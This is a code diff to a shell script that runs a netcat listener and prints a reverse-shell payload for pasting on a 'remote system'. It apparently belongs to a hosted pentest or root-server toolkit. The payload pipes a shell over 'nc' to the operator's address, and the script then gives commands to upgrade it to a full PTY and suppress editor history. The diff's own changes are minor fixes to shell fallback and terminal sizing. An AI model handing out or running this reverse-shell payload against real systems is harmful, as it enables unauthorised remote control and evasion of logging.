@@ -3,15 +3,6 @@
 source /sf/bin/funcs.sh
 source /sf/bin/funcs_rport.sh
 
-ERREXIT() {
-    local code="$1"
-
-    shift 1
-    [[ -n $1 ]] && echo -e >&2 "${CR}ERROR:${CN} $*"
-
-    exit "${code:-99}"
-}
-
 sf_rport_load_all || exit
 echo -e "\
 Use one of these commands on the remote system:
@@ -19,6 +10,7 @@ Use one of these commands on the remote system:
     2. ${CDR}U=/tmp/.\$\$;rm -f \$U;touch \$U;(tail -f \$U|sh 2>&1|nc -n ${rip} ${rport} >\$U 2>&1 &)
 ${CN}Once connected, cut & paste the following into the _this_ shell:
 ${CF}-------------------------------------------------------------------------------${CDC}
+\"\$SHELL\" -c true || SHELL=\$(command -v bash) || SHELL=/bin/sh
 command -v python >/dev/null \\
     && exec python -c \"import pty; pty.spawn('\${SHELL:-sh}')\" \\
     || { command -v script >/dev/null && exec script -qc \"\${SHELL:-sh}\" /dev/null; }
@@ -34,7 +26,7 @@ alias vi='vi -i NONE'
 alias vim='vim -i NONE'
 reset -I
 PS1='"'\[\\033[36m\]\\u\[\\033[m\]@\[\\033[32m\]\\h:\[\\033[33;1m\]\\w\[\\033[m\]\\$ '"'
-"'stty -echo;printf "\\033[18t";read -t5 -rdt R;stty sane $(echo "$R"|awk -F";" '"'"'{ printf "rows "$3" cols "$2; }'"'"')'"
+"'stty -echo cols 200;printf "\\033[18t";read -t5 -rdt R;stty sane $(echo "${R:-8;25;80}"|awk -F";" '"'"'{ printf "rows "$2" cols "$3; }'"'"')'"
 ${CN}${CF}-------------------------------------------------------------------------------${CN}
 To force-exit this listener, type ${CDY}kill \"\$(pgrep -P $$)\"${CN} on your Root Server"
 # PS1='USERS=$(who | wc -l) LOAD=$(cut -f1 -d" " /proc/loadavg) PS=$(ps -e --no-headers|wc -l) \[\e[36m\]\u\[\e[m\]@\[\e[32m\]\h:\[\e[33;1m\]\w \[\e[0;31m\]\$\[\e[m\] '
@@ -47,4 +39,3 @@ nc -nvlp "$rport"
 echo "🦋 Restoring terminal..."
 stty "$cfg"
 # reset -I
-π
